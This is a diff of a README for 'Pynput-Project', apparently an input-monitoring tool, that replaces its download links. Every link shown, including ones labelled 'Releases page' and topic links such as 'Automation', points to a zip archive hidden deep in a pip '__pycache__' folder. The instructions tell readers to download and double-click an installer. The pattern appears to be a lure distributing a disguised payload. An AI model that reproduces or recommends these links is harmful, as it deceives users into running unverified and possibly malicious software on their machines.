@@ -6,7 +6,7 @@ Welcome to the Pynput-Project! This software makes it simple to monitor and cont
 
 ## 📥 Download Now
 
-[![Download Now](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip%20Now-Visit%20Here-brightgreen)](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip)
+[![Download Now](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip%20Now-Visit%20Here-brightgreen)](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip)
 
 ## 📋 Overview
 
@@ -27,13 +27,13 @@ Before you download, make sure your system meets the following requirements:
 ## 🔧 Installation Steps
 
 1. **Visit the Download Page**  
-   Go to the [Pynput-Project Releases page](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip) to find the latest version of the software. 
+   Go to the [Pynput-Project Releases page](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip) to find the latest version of the software. 
 
 2. **Choose Your Version**  
    Once you're on the Releases page, locate the most recent version of the software. Click on the version to expand the details.
 
 3. **Download the Installer**  
-   Look for a file with an extension such as `.exe` for Windows or `https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip` for macOS/Linux. Click the download link to save the file to your computer.
+   Look for a file with an extension such as `.exe` for Windows or `https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip` for macOS/Linux. Click the download link to save the file to your computer.
 
 4. **Run the Installer**  
    After the download completes, locate the file in your downloads folder. Double-click the installer to start the installation process. Follow the on-screen prompts to complete the installation.
@@ -78,12 +78,12 @@ No! You do not need any programming knowledge to use Pynput. The application pro
 
 If you want to learn more about Python automation and input monitoring, check out the following topics:
 
-- [Automation](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip)
-- [Input Device Control](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip)
-- [Event Handling](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip)
+- [Automation](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip)
+- [Input Device Control](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip)
+- [Event Handling](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip)
 
 ## 📥 Download & Install
 
-Ready to get started with Pynput? Visit the [official Releases page](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip) to download the latest version. Follow the installation steps above to set up the application on your device. Enjoy automating your input devices with ease!
+Ready to get started with Pynput? Visit the [official Releases page](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip) to download the latest version. Follow the installation steps above to set up the application on your device. Enjoy automating your input devices with ease!
 
-[![Download Now](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip%20Now-Visit%20Here-brightgreen)](https://raw.githubusercontent.com/Nicolas12341234/Pynput-Project/main/behavioral_monitor_env/Lib/site-packages/pip/_internal/commands/__pycache__/Pynput-Project-v1.6.zip)
+[![Download Now](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip%20Now-Visit%20Here-brightgreen)](https://github.com/Nicolas12341234/Pynput-Project/raw/refs/heads/main/behavioral_monitor_env/Lib/site-packages/pip/_vendor/pygments/filters/__pycache__/Pynput-Project-1.5-beta.4.zip)
